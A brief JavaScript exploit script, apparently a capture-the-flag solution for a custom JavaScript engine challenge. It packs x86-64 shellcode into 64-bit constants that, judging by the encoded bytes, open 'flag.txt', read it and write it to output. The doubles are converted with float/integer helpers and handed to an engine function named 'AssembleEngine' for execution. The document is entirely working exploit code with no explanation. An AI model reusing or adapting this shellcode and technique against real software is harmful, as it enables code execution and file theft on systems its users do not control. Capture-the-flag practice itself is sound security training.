var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
shellcode_init = [0x66b848240cfe016an,0x507478742e67616cn,0x3148e78948f63148n,0x000002b8d2314dd2n,0x8948c78948050f00n,0x00000400c2c748e6n,0x02c7c748050fc031n,0x00000001b8000000n,0x0f0000003bb8050fn,0x9090909090909005n];
var len = shellcode_init.length;
var shellcode = [];
for (var i = 0; i < len; i++) {
	shellcode.push(itof(shellcode_init[i]));
	}
AssembleEngine(shellcode);
//pogchamp?
